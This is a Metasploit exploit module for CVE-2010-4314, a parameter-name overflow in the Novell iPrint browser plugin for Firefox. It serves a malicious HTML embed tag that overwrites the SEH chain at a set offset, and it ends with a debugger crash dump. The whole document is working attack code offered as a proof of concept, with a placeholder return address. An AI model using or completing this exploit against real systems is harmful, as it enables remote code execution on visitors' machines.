require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Novell iPrint Client Browser Plugin Parameter Name PoC',
			'Description'    => %q{
					This module is simply a trigger for the Mozilla browser plugin npnipp.dll.
				This module was tested against npnipp.dll iPrint Plugin 1.0.0.1.
			},
			'License'        => 'BSD_LICENSE',
			'Author'         => [ 'Mario Ceballos' ],
			'Version'        => '$Revision: $',
			'References'     =>
				[
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-139/' ],
					[ 'CVE', '2010-4314' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'	=> "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP3 / FireFox 3.6.24', { 'Ret' => 0x42424242 } ]
				],
			'DisclosureDate' => 'Dec 26 2010',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def auto_target(cli, request)

		mytarget = nil

		agent = request.headers['User-Agent']	
		
		if agent =~ /Firefox\/3\.6\.24/
			mytarget = targets[0]
		else
			print_error("Unsupported target..")
		end
		
		mytarget
	end	

	def on_request_uri(cli, request)

		mytarget = target

		if target.name == 'Windows XP SP3 / FireFox 3.6.24'
			mytarget = auto_target(cli, request)
			if (not mytarget)
				send_not_found(cli)
				return
			end
		end

		sploit = pattern_create(1024)
		sploit[476, 8] = [target.ret].pack('V') * 2

		content = %Q|
<html>
<body>
<embed type=application/x-Novell-ipp
#{sploit}="op-printer-get-status">
</embed>
</body>
</html>
		|

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
__END__
0:000> !exchain
0012f464: 42424242
Invalid exception stack at 42424242
0:000> dd esp+12
0012f28e  41324141 41413341 35414134 41364141
0012f29e  41413741 39414138 41304241 42413142
0012f2ae  33424132 41344241 42413542 37424136
0012f2be  41384241 43413942 31434130 41324341
0012f2ce  43413343 35434134 41364341 43413743
0012f2de  39434138 41304441 44413144 33444132
0012f2ee  41344441 44413544 37444136 41384441
0012f2fe  45413944 31454130 41324541 45413345
